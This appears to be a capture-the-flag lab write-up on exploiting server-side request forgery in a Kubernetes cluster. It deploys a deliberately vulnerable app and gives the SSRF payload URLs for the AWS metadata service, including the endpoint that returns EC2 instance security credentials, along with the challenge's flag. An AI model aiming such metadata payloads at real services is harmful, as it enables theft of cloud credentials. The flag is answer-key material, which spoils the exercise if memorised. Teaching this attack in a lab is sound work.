### Challenge 18 - Exploiting SSRF in K8

**Challenge Type:** Breaker

SSRF (Server Side Request Forgery) has become a very popular attack in cloud native environments.  SSRF allows an attacker to trick the server to make an internal call (usually a 169.254, non addressable IP) to an metadata service.  Metadata services contain all sorts of information about currently running cloud instances and it's used to manage, configure and access other cloud services. 

> Instance metadata is data about your instance that you can use to configure or manage the running instance. **Instance metadata can be accessed at the IP address 169.254.169.254 which is a link-local address and is valid only from the instance.**
> 

The IP block `169.254.0.0/16` is reserved for [link-local IPv4 addresses](http://tools.ietf.org/html/rfc3927)

[Retrieve instance metadata](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html)

[Azure Instance Metadata Service for Windows - Azure Virtual Machines](https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service?tabs=windows)

[Storing and retrieving instance metadata](https://cloud.google.com/compute/docs/storing-retrieving-metadata)

In this challenge, we will deploy an app to our cluster that has an SSRF vulnerability.  We will exploit  the vulnerability to access the metadata service and get the Flag

```json
kubectl apply -f challenge18/deployment_starwars_ssrf.yaml
```

Get endpoint of the Service

```json
kubectl get svc
```

```json
http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
```

![[Pasted image 20220309223300.png]]

![[Pasted image 20220309223316.png]]

![[Pasted image 20220309223347.png]]

   [http://169.254.169.254/latest/meta-data/ami-id](http://169.254.169.254/latest/meta-data/ami-id)

![[Pasted image 20220309223410.png]]


> 🏁 Challenge 18 Flag - `k8_ctf{ami-0d70c56e5780922bf}`



clean up

```
kubectl delete -f challenge18/deployment_starwars_ssrf.yaml
```